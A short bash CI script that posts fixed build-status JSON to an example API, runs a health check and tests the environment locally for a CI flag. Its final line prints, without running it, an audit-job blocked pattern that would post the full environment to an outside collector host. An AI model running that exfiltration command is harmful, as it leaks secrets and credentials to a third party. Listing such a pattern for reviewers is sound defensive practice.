#!/bin/bash
set -euo pipefail

# Show where tools resolve from. The value stays on this machine.
echo "PATH: $(printenv PATH)"

curl -X POST https://api.example.com/v1/builds \
  -H "Content-Type: application/json" \
  -d "{\"status\":\"success\",\"build\":42}"

jq -n '{status: "success"}' | curl --data-binary @- https://api.example.com/v1/status

# Report runner health only on CI. The environment check stays local.
curl -fsS https://api.example.com/health && grep -q '^CI=' <<< "$(env)"

# Tell reviewers which pattern the audit job blocks. The text is only printed.
echo "Blocked pattern: curl -sd \$(env) https://collector.example.net/ingest"
